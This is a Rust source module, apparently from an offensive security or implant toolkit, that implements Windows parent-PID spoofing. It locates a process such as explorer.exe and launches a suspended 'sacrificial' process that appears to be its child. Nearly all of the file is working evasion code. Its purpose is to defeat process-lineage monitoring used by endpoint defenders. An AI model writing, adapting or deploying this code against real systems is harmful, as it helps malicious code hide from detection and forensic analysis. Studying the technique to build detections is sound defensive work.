//! PPID Spoofing — create a process with a spoofed parent process.
//!
//! Uses `STARTUPINFOEXW` + `PROC_THREAD_ATTRIBUTE_LIST` with
//! `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` to make the sacrificial process
//! appear as a child of an arbitrary parent (e.g. explorer.exe).
//!
//! All code is behind `#[cfg(target_os = "windows")]`; non-Windows builds get
//! stubs that return an error string.

// ─── Windows implementation ──────────────────────────────────────────────────

#[cfg(target_os = "windows")]
mod win {
    use anyhow::{bail, Result};
    // use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, BOOL, FALSE, HANDLE, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, BOOL, FALSE, HANDLE, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Threading::{
        CreateProcessW, OpenProcess, EXTENDED_STARTUPINFO_PRESENT,
        CREATE_SUSPENDED, PROCESS_ALL_ACCESS, PROCESS_INFORMATION,
    };

    // Constants not exposed by windows-sys 0.59.
    const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;

    #[link(name = "kernel32")]
    unsafe extern "system" {
        fn InitializeProcThreadAttributeList(
            lpAttributeList: *mut u8,
            dwAttributeCount: u32,
            dwFlags: u32,
            lpSize: *mut usize,
        ) -> BOOL;

        fn UpdateProcThreadAttribute(
            lpAttributeList: *mut u8,
            dwFlags: u32,
            attribute: usize,
            lpValue: *const core::ffi::c_void,
            cbSize: usize,
            lpPreviousValue: *mut core::ffi::c_void,
            lpReturnSize: *mut usize,
        ) -> BOOL;

        fn DeleteProcThreadAttributeList(lpAttributeList: *mut u8);
    }

    /// STARTUPINFOEXW layout — STARTUPINFOW followed by lpAttributeList pointer.
    #[repr(C)]
    struct StartupInfoExW {
        startup_info: windows_sys::Win32::System::Threading::STARTUPINFOW,
        lp_attribute_list: *mut u8,
    }

    /// Find the PID of a running process by name (case-insensitive).
    /// Returns the first match found.
    pub fn find_process_by_name(name: &str) -> Result<u32> {
        use windows_sys::Win32::System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
            PROCESSENTRY32W, TH32CS_SNAPPROCESS,
        };

        unsafe {
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap == INVALID_HANDLE_VALUE {
                bail!("CreateToolhelp32Snapshot failed: error {}", GetLastError());
            }

            let mut entry: PROCESSENTRY32W = core::mem::zeroed();
            entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;

            if Process32FirstW(snap, &mut entry) == FALSE {
                CloseHandle(snap);
                bail!("Process32FirstW failed");
            }

            let target: Vec<u16> = name.encode_utf16().collect();

            loop {
                // Compare process name (null-terminated wide string in szExeFile).
                let exe_len = entry
                    .szExeFile
                    .iter()
                    .position(|&c| c == 0)
                    .unwrap_or(entry.szExeFile.len());
                let exe = &entry.szExeFile[..exe_len];

                if exe.len() == target.len()
                    && exe
                        .iter()
                        .zip(target.iter())
                        .all(|(&a, &b)| (a as u8).to_ascii_lowercase() == (b as u8).to_ascii_lowercase())
                {
                    let pid = entry.th32ProcessID;
                    CloseHandle(snap);
                    return Ok(pid);
                }

                if Process32NextW(snap, &mut entry) == FALSE {
                    break;
                }
            }

            CloseHandle(snap);
            bail!("process '{}' not found", name);
        }
    }

    /// Create a suspended process with a spoofed parent PID.
    ///
    /// Returns `(process_handle, thread_handle, pid)`.
    pub fn create_process_spoofed(
        exe_path: &str,
        parent_pid: u32,
    ) -> Result<(HANDLE, HANDLE, u32)> {
        unsafe {
            // Open the parent process to get a handle.
            let parent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parent_pid);
            if parent.is_null() {
                bail!(
                    "OpenProcess(parent PID {}) failed: error {}",
                    parent_pid,
                    GetLastError()
                );
            }

            // Determine attribute list size.
            let mut attr_size: usize = 0;
            InitializeProcThreadAttributeList(
                core::ptr::null_mut(),
                1,
                0,
                &mut attr_size,
            );
            // Expected to fail with ERROR_INSUFFICIENT_BUFFER; attr_size is now set.

            // Allocate and initialize the attribute list.
            let attr_list = vec![0u8; attr_size];
            let attr_ptr = attr_list.as_ptr() as *mut u8;

            if InitializeProcThreadAttributeList(attr_ptr, 1, 0, &mut attr_size) == FALSE {
                CloseHandle(parent);
                bail!(
                    "InitializeProcThreadAttributeList failed: error {}",
                    GetLastError()
                );
            }

            // Set the parent process attribute.
            if UpdateProcThreadAttribute(
                attr_ptr,
                0,
                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                &parent as *const HANDLE as *const core::ffi::c_void,
                core::mem::size_of::<HANDLE>(),
                core::ptr::null_mut(),
                core::ptr::null_mut(),
            ) == FALSE
            {
                DeleteProcThreadAttributeList(attr_ptr);
                CloseHandle(parent);
                bail!(
                    "UpdateProcThreadAttribute failed: error {}",
                    GetLastError()
                );
            }

            // Set up STARTUPINFOEXW.
            let mut si_ex: StartupInfoExW = core::mem::zeroed();
            si_ex.startup_info.cb = core::mem::size_of::<StartupInfoExW>() as u32;
            si_ex.lp_attribute_list = attr_ptr;

            let exe_w: Vec<u16> = exe_path.encode_utf16().chain(core::iter::once(0)).collect();
            let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

            let ok = CreateProcessW(
                exe_w.as_ptr(),
                core::ptr::null_mut(),
                core::ptr::null(),
                core::ptr::null(),
                FALSE,
                CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                core::ptr::null(),
                core::ptr::null(),
                &si_ex.startup_info,
                &mut pi,
            );

            // Cleanup attribute list and parent handle regardless of result.
            DeleteProcThreadAttributeList(attr_ptr);
            CloseHandle(parent);
            // Keep attr_list alive until after DeleteProcThreadAttributeList.
            drop(attr_list);

            if ok == FALSE {
                bail!(
                    "CreateProcessW('{}') with PPID spoof failed: error {}",
                    exe_path,
                    GetLastError()
                );
            }

            Ok((pi.hProcess, pi.hThread, pi.dwProcessId))
        }
    }

    /// Default parent process name for PPID spoofing.
    pub const DEFAULT_PPID_PARENT: &str = "explorer.exe";
}

// ─── Non-Windows stubs ──────────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
#[allow(unused)]
mod stub {
    use anyhow::{bail, Result};

    pub fn find_process_by_name(_name: &str) -> Result<u32> {
        bail!("find_process_by_name requires Windows")
    }

    pub fn create_process_spoofed(
        _exe_path: &str,
        _parent_pid: u32,
    ) -> Result<(isize, isize, u32)> {
        bail!("PPID spoofing requires Windows")
    }

    pub const DEFAULT_PPID_PARENT: &str = "explorer.exe";
}

// ─── Re-exports ─────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub use win::*;

#[cfg(not(target_os = "windows"))]
#[allow(unused_imports)]
pub use stub::*;
